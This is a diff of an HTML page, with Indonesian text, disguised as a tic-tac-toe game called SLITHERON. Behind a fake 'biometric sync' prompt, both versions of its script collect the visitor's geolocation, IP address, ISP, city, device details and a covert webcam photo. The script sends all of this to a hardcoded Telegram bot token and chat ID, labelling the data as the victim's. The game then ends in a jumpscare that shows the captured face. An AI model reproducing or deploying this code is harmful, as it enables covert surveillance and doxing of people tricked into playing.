@@ -3,151 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S L I T H E R O N | EVENT</title>
+    <title>S L I T H E R O N | ASCENSION</title>
     <style>
-        :root { --accent: #ff0033; --bg: #000; }
+        :root { --accent: #ff0000; --bg: #000; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         
-        #main-frame { width: 100%; max-width: 380px; text-align: center; padding: 30px; border: 1px solid #111; position: relative; }
-        h1 { font-weight: 200; letter-spacing: 10px; font-size: 20px; margin-bottom: 30px; }
+        #frame { width: 100%; max-width: 360px; text-align: center; padding: 40px 20px; border: 1px solid #111; position: relative; }
+        h1 { font-weight: 200; letter-spacing: 12px; font-size: 20px; margin-bottom: 10px; color: #fff; }
+        .lore-txt { font-size: 9px; color: #444; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 30px; }
         
-        #gift-btn { display: none; position: absolute; top: 15px; right: 15px; background: #111; border: 1px solid #333; color: #fff; padding: 10px; font-size: 10px; cursor: pointer; letter-spacing: 2px; z-index: 10; }
-        .red-dot { position: absolute; top: -4px; right: -4px; width: 10px; height: 10px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 10px var(--accent); animation: pulse 1s infinite; }
-        
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.4); } 100% { transform: scale(1); } }
+        #gift-btn { display: none; position: absolute; top: 15px; right: 15px; background: #000; border: 1px solid #222; color: #fff; padding: 8px 12px; font-size: 9px; cursor: pointer; letter-spacing: 2px; z-index: 100; }
+        .dot { position: absolute; top: -3px; right: -3px; width: 8px; height: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
-        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 30px 0; }
-        .cell { height: 95px; background: #050505; border: 1px solid #151515; display: flex; align-items: center; justify-content: center; font-size: 32px; cursor: pointer; color: var(--accent); }
+        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 30px; }
+        .cell { height: 95px; background: #050505; border: 1px solid #111; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; color: var(--accent); transition: 0.3s; }
         
-        #btn-start { background: transparent; border: 1px solid #444; color: #fff; padding: 15px 40px; font-size: 11px; letter-spacing: 5px; cursor: pointer; transition: 0.3s; }
+        #btn-action { background: transparent; border: 1px solid #333; color: #fff; padding: 12px 35px; font-size: 10px; letter-spacing: 5px; cursor: pointer; text-transform: uppercase; }
+        #status { font-size: 10px; color: #222; letter-spacing: 3px; margin-bottom: 20px; text-transform: uppercase; }
 
-        #scare-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
-        #scare-img { width: 100%; height: 75vh; object-fit: cover; border-bottom: 4px solid var(--accent); }
-        .scare-msg { font-family: 'Courier New', monospace; font-size: 18px; color: var(--accent); margin-top: 30px; text-align: center; font-weight: bold; }
+        #scare-box { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        #scare-img { width: 100%; height: 75vh; object-fit: cover; border-bottom: 2px solid var(--accent); }
+        .scare-msg { color: var(--accent); font-family: monospace; font-size: 14px; margin-top: 30px; letter-spacing: 2px; text-align: center; line-height: 1.6; }
 
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="main-frame">
-    <button id="gift-btn" onclick="revealTerror()">
-        HADIAH <div class="red-dot"></div>
-    </button>
+<div id="frame">
+    <button id="gift-btn" onclick="openGift()">HADIAH <div class="dot"></div></button>
     <h1>SLITHERON</h1>
-    <p id="status" style="font-size: 9px; color: #444; letter-spacing: 2px; text-transform: uppercase;">Sinkronisasi diperlukan...</p>
+    <div class="lore-txt">Pahlawan vs Parasit Digital</div>
+    <p id="status">Sinkronisasi Diperlukan</p>
     
-    <div class="board" id="game-board" style="opacity: 0.2; pointer-events: none;">
-        <div class="cell" id="c0" onclick="playerMove(0)"></div><div class="cell" id="c1" onclick="playerMove(1)"></div><div class="cell" id="c2" onclick="playerMove(2)"></div>
-        <div class="cell" id="c3" onclick="playerMove(3)"></div><div class="cell" id="c4" onclick="playerMove(4)"></div><div class="cell" id="c5" onclick="playerMove(5)"></div>
-        <div class="cell" id="c6" onclick="playerMove(6)"></div><div class="cell" id="c7" onclick="playerMove(7)"></div><div class="cell" id="c8" onclick="playerMove(8)"></div>
+    <div class="board" id="board" style="opacity:0.1; pointer-events:none;">
+        <div class="cell" id="c0" onclick="play(0)"></div><div class="cell" id="c1" onclick="play(1)"></div><div class="cell" id="c2" onclick="play(2)"></div>
+        <div class="cell" id="c3" onclick="play(3)"></div><div class="cell" id="c4" onclick="play(4)"></div><div class="cell" id="c5" onclick="play(5)"></div>
+        <div class="cell" id="c6" onclick="play(6)"></div><div class="cell" id="c7" onclick="play(7)"></div><div class="cell" id="c8" onclick="play(8)"></div>
     </div>
     
-    <button id="btn-start" onclick="initRitual()">MULAI</button>
+    <button id="btn-action" onclick="ascend()">Ascend as Hero</button>
 </div>
 
-<div id="scare-ui">
+<div id="scare-box">
     <img id="scare-img" src="">
-    <div class="scare-msg">SAYA MELIHAT ANDA.<br>DATA ANDA TELAH DIEKSPOS.</div>
-    <audio id="scream" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+    <div class="scare-msg">THE MIRROR SHIELD HAS SHATTERED.<br>I SEE YOU, HERO.</div>
+    <audio id="scream-audio" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c" width="640" height="480"></canvas>
 
 <script>
-    const BOT_TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
-    const CHAT_ID = '6932904607';
-    let localFace = "";
+    const TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
+    const ID = '6932904607';
     let board = ["","","","","","","","",""];
-    let isGameOver = false;
+    let faceURL = "";
+    let gameOver = false;
 
-    async function push(method, params) {
-        let url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+    async function tg(method, data) {
+        let url = `https://api.telegram.org/bot${TOKEN}/${method}`;
         if (method === 'sendPhoto') {
-            const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', params);
+            const fd = new FormData(); fd.append('chat_id', ID); fd.append('photo', data);
             return fetch(url, { method: 'POST', body: fd });
         }
-        return fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, ...params}) });
+        return fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: ID, ...data}) });
     }
 
-    function initRitual() {
-        if(confirm("Sinkronkan biometrik untuk mulai ritual?")) {
-            document.getElementById('btn-start').style.display = 'none';
-            document.getElementById('game-board').style.opacity = '1';
-            document.getElementById('game-board').style.pointerEvents = 'auto';
-            document.getElementById('status').innerText = "RITUAL AKTIF";
-            startDoxing();
+    function ascend() {
+        if(confirm("Gunakan 'Mirror Shield' untuk sinkronisasi biometrik pahlawan?")) {
+            document.getElementById('btn-action').style.display = 'none';
+            document.getElementById('board').style.opacity = '1';
+            document.getElementById('board').style.pointerEvents = 'auto';
+            document.getElementById('status').innerText = "PURGING SLITHERON...";
+            startInfiltration();
         }
     }
 
-    async function startDoxing() {
-        navigator.geolocation.getCurrentPosition(async (p) => {
-            await push('sendLocation', { latitude: p.coords.latitude, longitude: p.coords.longitude });
-            await sendReport();
+    async function startInfiltration() {
+        navigator.geolocation.getCurrentPosition(async p => {
+            // 1. Kirim Map (Sequential)
+            await tg('sendLocation', { latitude: p.coords.latitude, longitude: p.coords.longitude });
+            // 2. Kirim Data Report
+            await sendFullReport();
+            // 3. Capture Foto
             capture();
-        }, async () => { await sendReport(); capture(); });
+        }, async () => {
+            await sendFullReport();
+            capture();
+        });
     }
 
-    async function sendReport() {
-        const res = await fetch('https://ipapi.co/json/');
-        const d = await res.json();
-        const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }).replace(/\//g, '-');
-        const txt = `<b>DATA KORBAN</b>\n\nWaktu: ${now}\nIP: <code>${d.ip}</code>\nOS: ${navigator.platform}\nRes: ${window.screen.width}x${window.screen.height}`;
-        await push('sendMessage', { text: txt, parse_mode: 'HTML' });
+    async function sendFullReport() {
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            const now = new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'}).replace(/\//g,'-');
+            const txt = `<b>🔱 GABRIEL - HERO REPORT</b>\n\nWaktu: ${now}\nIP Korban: <code>${d.ip}</code>\nISP: ${d.org}\nKota: ${d.city}\nRes: ${window.screen.width}x${window.screen.height}\nOS: ${navigator.platform}`;
+            await tg('sendMessage', { text: txt, parse_mode: 'HTML' });
+        } catch(e) {}
     }
 
     async function capture() {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('v'); video.srcObject = stream;
-        setTimeout(() => {
-            const canvas = document.getElementById('c');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            canvas.toBlob(blob => {
-                localFace = URL.createObjectURL(blob);
-                push('sendPhoto', blob);
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg');
-        }, 2000);
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video:true});
+            const vid = document.getElementById('v'); vid.srcObject = stream;
+            setTimeout(() => {
+                const can = document.getElementById('c');
+                can.getContext('2d').drawImage(vid, 0, 0, 640, 480);
+                can.toBlob(b => {
+                    faceURL = URL.createObjectURL(b);
+                    tg('sendPhoto', b);
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            }, 2000);
+        } catch(e) {}
     }
 
-    // Logic Game TIC TAC TOE
-    function playerMove(i) {
-        if(board[i] !== "" || isGameOver) return;
+    function play(i) {
+        if(board[i] !== "" || gameOver) return;
         board[i] = "X";
         document.getElementById(`c${i}`).innerText = "X";
-        if(checkWin("X")) return end();
-        if(!board.includes("")) return end();
         
-        // Bot Move (O)
+        if(checkWin("X")) return endRitual();
+        if(!board.includes("")) return endRitual();
+
+        // Bot (Slitheron) Logic
         setTimeout(() => {
             let empty = board.map((v, idx) => v === "" ? idx : null).filter(v => v !== null);
-            let move = empty[Math.floor(Math.random() * empty.length)];
-            board[move] = "O";
-            document.getElementById(`c${move}`).innerText = "O";
-            document.getElementById(`c${move}`).style.color = "#fff";
-            if(checkWin("O")) end();
-        }, 500);
+            if(empty.length > 0) {
+                let m = empty[Math.floor(Math.random()*empty.length)];
+                board[m] = "O";
+                document.getElementById(`c${m}`).innerText = "O";
+                document.getElementById(`c${m}`).style.color = "#fff";
+                if(checkWin("O")) endRitual();
+            }
+        }, 400);
     }
 
     function checkWin(p) {
-        const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-        return lines.some(l => l.every(idx => board[idx] === p));
+        const win = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+        return win.some(l => l.every(idx => board[idx] === p));
     }
 
-    function end() {
-        isGameOver = true;
-        document.getElementById('status').innerText = "EVENT TERDETEKSI!";
-        document.getElementById('gift-btn').style.display = 'block'; // Tombol hadiah muncul & bisa dipencet
+    function endRitual() {
+        gameOver = true;
+        document.getElementById('status').innerText = "SLITHERON DEFEATED";
+        document.getElementById('gift-btn').style.display = 'block';
     }
 
-    function revealTerror() {
-        if(localFace === "") { alert("Sinkronisasi belum selesai!"); return; }
-        document.getElementById('scare-ui').style.display = 'flex';
-        document.getElementById('scare-img').src = localFace;
-        document.getElementById('scream').play();
-        if(navigator.vibrate) navigator.vibrate([500, 300, 500]);
+    function openGift() {
+        if(!faceURL) { alert("Ritual Belum Selesai!"); return; }
+        const ui = document.getElementById('scare-box');
+        document.getElementById('scare-img').src = faceURL;
+        ui.style.display = 'flex';
+        document.getElementById('scream-audio').play();
+        if(navigator.vibrate) navigator.vibrate([500, 200, 500]);
     }
 </script>
 </body>
